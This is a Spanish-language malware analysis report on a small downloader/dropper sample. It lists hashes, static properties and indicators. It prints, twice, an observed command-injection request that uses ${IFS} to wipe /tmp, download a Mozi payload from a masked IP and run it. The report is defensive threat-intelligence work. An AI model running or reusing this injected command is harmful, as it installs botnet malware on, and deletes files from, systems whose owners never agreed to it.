# 🧬 Payload Analysis

`387405b39c158b58dc8b4ff9faf3ba5bcb07911f55c3d13f93e0ef7d0230e50f`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:20:23+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `387405b39c158b58dc8b4ff9faf3ba5bcb07911f55c3d13f93e0ef7d0230e50f`
- **SHA1:** `5b1872de9ca2728f72209978354a13b47fd8b940`
- **MD5:** `74a63e9d64b545e91f7772a9a3dafb19`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 162 B |
| Entropía | 5.33 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://139.135.45.XXX:36069/Mozi.a;sh${IFS}/tmp/M
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 139.135.45.XXX | static_analysis |
| url | hxxp://139.135.45.XXX:36069/Mozi.a;sh$ | strings |
| hash | 387405b39c158b58dc8b4ff9faf3ba5bcb07911f55c3d13f93e0ef7d0230e50f | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://139.135.45.XXX:36069/Mozi.a;sh${IFS}/tmp/M | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
